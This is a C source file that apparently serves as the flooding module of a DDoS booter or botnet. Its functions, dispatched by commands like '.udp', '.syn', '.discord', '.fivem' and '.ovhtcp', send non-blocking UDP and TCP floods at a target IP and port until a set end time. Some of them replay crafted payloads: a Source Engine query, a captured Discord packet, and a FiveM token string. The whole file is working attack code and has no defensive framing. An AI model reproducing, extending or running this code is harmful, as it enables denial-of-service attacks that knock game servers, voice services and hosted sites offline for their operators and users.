#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "attacks.h"

unsigned char payload_vse[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
unsigned char payload_discord2[] = "\x94\x00\xb0\x1a\xef\x69\xa8\xa1\x59\x69\xba\xc5\x08\x00\x45\x00\x00\x43\xf0\x12\x00\x00\x80\x11\x00\x00\xc0\xa8\x64\x02\xb9\x29\x8e\x31\xc2\x30\xc3\x51\x00\x2f\x6c\x46\x90\xf8\x5f\x1b\x8e\xf5\x56\x8f\x00\x05\xe1\x26\x96\xa9\xde\xe8\x84\xba\x65\x38\x70\x68\xf5\x70\x0e\x12\xe2\x54\x20\xe0\x7f\x49\x0d\x9e\x44\x89\xec\x4b\x7f";
unsigned char payload_fivem[] = "\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35";

void generate_random_data(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

static char *generate_end(int length) {
    static char end[16];
    const char chars[] = "\n\r";
    
    for (int i = 0; i < length && i < 15; i++) {
        end[i] = chars[rand() % 2];
    }
    end[length] = '\0';
    return end;
}

char **ovh_builder(const char *ip, int port, int *count) {
    char **packet_list = malloc(sizeof(char *) * 200);
    int packet_count = 0;

    const char *paths[] = {
        "/0/0/0/0/0/0",
        "/0/0/0/0/0/0/",
        "\\0\\0\\0\\0\\0\\0",
        "\\0\\0\\0\\0\\0\\0\\"
    };

    for (int p = 0; p < 4; p++) {
        unsigned char random_part[256];
        generate_random_data(random_part, 256);
        
        char *end = generate_end(4);
        char *packet = malloc(4096);

        snprintf(packet, 4096, "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n",
                 paths[p], ip, port);

        packet_list[packet_count++] = packet;

        if (packet_count >= 200) break;
    }

    *count = packet_count;
    return packet_list;
}

void *(*get_attack_function(const char *method))(void *) {
    if (strcmp(method, ".udp") == 0) return attack_udp_bypass;
    if (strcmp(method, ".tcp") == 0) return attack_tcp_bypass;
    if (strcmp(method, ".mix") == 0) return attack_tcp_udp_bypass;
    if (strcmp(method, ".syn") == 0) return attack_syn;
    if (strcmp(method, ".vse") == 0) return attack_vse;
    if (strcmp(method, ".discord") == 0) return attack_discord2;
    if (strcmp(method, ".fivem") == 0) return attack_fivem;
    if (strcmp(method, ".ovhtcp") == 0) return attack_ovh_tcp;
    if (strcmp(method, ".ovhudp") == 0) return attack_ovh_udp;
    return NULL;
}

void *attack_ovh_tcp(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    int packet_count;
    char **packets = ovh_builder(params->ip, params->port, &packet_count);

    time_t start_time = time(NULL);
    printf("[THREAD] OVH TCP attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        int sndbuf = 2 * 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

        connect(sock, (struct sockaddr *)&server, sizeof(server));
        
        for (int i = 0; i < packet_count; i++) {
            send(sock, packets[i], strlen(packets[i]), MSG_NOSIGNAL | MSG_DONTWAIT);
            total_sent++;
        }

        close(sock);
    }

    for (int i = 0; i < packet_count; i++) {
        free(packets[i]);
    }
    free(packets);
    free(params);
    printf("[THREAD] OVH TCP attack finished, sent %d requests\n", total_sent);
    return NULL;
}

void *attack_ovh_udp(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    int packet_count;
    char **packets = ovh_builder(params->ip, params->port, &packet_count);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[ERROR] Failed to create UDP socket\n");
        for (int i = 0; i < packet_count; i++) {
            free(packets[i]);
        }
        free(packets);
        free(params);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    time_t start_time = time(NULL);
    printf("[THREAD] OVH UDP attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int batch = 0; batch < 100; batch++) {
            for (int i = 0; i < packet_count; i++) {
                sendto(sock, packets[i], strlen(packets[i]), MSG_DONTWAIT,
                       (struct sockaddr *)&server, sizeof(server));
                total_sent++;
            }
        }
    }

    close(sock);
    for (int i = 0; i < packet_count; i++) {
        free(packets[i]);
    }
    free(packets);
    free(params);
    printf("[THREAD] OVH UDP attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_vse(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[ERROR] Failed to create VSE socket\n");
        free(params);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    time_t start_time = time(NULL);
    printf("[THREAD] VSE attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    int payload_size = sizeof(payload_vse) - 1;
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_vse, payload_size, MSG_DONTWAIT,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }

    close(sock);
    free(params);
    printf("[THREAD] VSE attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_discord2(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[ERROR] Failed to create Discord socket\n");
        free(params);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    time_t start_time = time(NULL);
    printf("[THREAD] Discord attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    int payload_size = sizeof(payload_discord2) - 1;
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_discord2, payload_size, MSG_DONTWAIT,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }

    close(sock);
    free(params);
    printf("[THREAD] Discord attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_fivem(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[ERROR] Failed to create FiveM socket\n");
        free(params);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    time_t start_time = time(NULL);
    printf("[THREAD] FiveM attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    int payload_size = sizeof(payload_fivem) - 1;
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_fivem, payload_size, MSG_DONTWAIT,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }

    close(sock);
    free(params);
    printf("[THREAD] FiveM attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_udp_bypass(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char packet[8192];

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[ERROR] Failed to create UDP socket\n");
        free(params);
        return NULL;
    }

    int sndbuf = 8 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    time_t start_time = time(NULL);
    printf("[THREAD] UDP attack started, target: %s:%d, duration: %ld seconds\n", 
           params->ip, params->port, params->end_time - start_time);

    int total_sent = 0;
    generate_random_data(packet, 8192);
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int batch = 0; batch < 500; batch++) {
            int size = 1024 + (rand() % 7168);
            sendto(sock, packet, size, MSG_DONTWAIT,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }

    close(sock);
    free(params);
    printf("[THREAD] UDP attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_tcp_bypass(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char packet[8192];

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    time_t start_time = time(NULL);
    printf("[THREAD] TCP attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    generate_random_data(packet, 8192);
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        int sndbuf = 4 * 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

        connect(sock, (struct sockaddr *)&server, sizeof(server));

        for (int i = 0; i < 50; i++) {
            int size = 1024 + (rand() % 7168);
            send(sock, packet, size, MSG_NOSIGNAL | MSG_DONTWAIT);
            total_sent++;
        }

        close(sock);
    }

    free(params);
    printf("[THREAD] TCP attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_tcp_udp_bypass(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock_tcp, sock_udp;
    struct sockaddr_in server;
    unsigned char packet[8192];

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    sock_udp = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_udp >= 0) {
        int sndbuf = 8 * 1024 * 1024;
        setsockopt(sock_udp, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(sock_udp, F_SETFL, O_NONBLOCK);
    }

    time_t start_time = time(NULL);
    printf("[THREAD] MIX attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    generate_random_data(packet, 8192);
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        int use_tcp = rand() % 2;
        int size = 1024 + (rand() % 7168);

        if (use_tcp) {
            sock_tcp = socket(AF_INET, SOCK_STREAM, 0);
            if (sock_tcp >= 0) {
                fcntl(sock_tcp, F_SETFL, O_NONBLOCK);
                int sndbuf = 4 * 1024 * 1024;
                setsockopt(sock_tcp, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

                connect(sock_tcp, (struct sockaddr *)&server, sizeof(server));
                
                for (int i = 0; i < 20; i++) {
                    send(sock_tcp, packet, size, MSG_NOSIGNAL | MSG_DONTWAIT);
                    total_sent++;
                }
                close(sock_tcp);
            }
        } else {
            if (sock_udp >= 0) {
                for (int i = 0; i < 50; i++) {
                    sendto(sock_udp, packet, size, MSG_DONTWAIT,
                           (struct sockaddr *)&server, sizeof(server));
                    total_sent++;
                }
            }
        }
    }

    if (sock_udp >= 0) close(sock_udp);
    free(params);
    printf("[THREAD] MIX attack finished, sent %d packets\n", total_sent);
    return NULL;
}

void *attack_syn(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char packet[8192];

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    time_t start_time = time(NULL);
    printf("[THREAD] SYN attack started, duration: %ld seconds\n", params->end_time - start_time);

    int total_sent = 0;
    generate_random_data(packet, 8192);
    
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int burst = 0; burst < 10; burst++) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            int size = 512 + (rand() % 1536);
            
            connect(sock, (struct sockaddr *)&server, sizeof(server));
            send(sock, packet, size, MSG_NOSIGNAL | MSG_DONTWAIT);
            total_sent++;
            
            close(sock);
        }
    }

    free(params);
    printf("[THREAD] SYN attack finished, sent %d packets\n", total_sent);
    return NULL;
}